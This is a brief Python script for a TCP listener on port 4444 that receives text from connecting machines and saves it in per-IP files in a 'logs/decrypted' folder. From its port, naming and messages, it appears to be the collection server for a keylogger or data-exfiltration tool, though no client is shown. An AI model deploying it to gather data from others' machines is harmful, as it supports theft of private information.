import socket
from datetime import datetime
import os

HOST = '0.0.0.0'
PORT = 4444
LOG_DIR = "logs/decrypted"
os.makedirs(LOG_DIR, exist_ok=True)

def save_log(ip, content):
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    filename = f"{LOG_DIR}/{ip.replace('.', '_')}.log"
    with open(filename, "a") as f:
        f.write(f"[{timestamp}] {content}\n")
    print(f"[+] Log appended to {filename}")

def main():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, PORT))
        s.listen()
        print(f"[+] Listening on port {PORT} for logs...")
        while True:
            conn, addr = s.accept()
            with conn:
                print(f"[!] Incoming connection from {addr}")
                while True:
                    data = conn.recv(1024)
                    if not data:
                        break
                    log_content = data.decode('utf-8').strip()
                    print(f"[{addr[0]}] {log_content}")
                    save_log(addr[0], log_content)

if __name__ == "__main__":
    main()

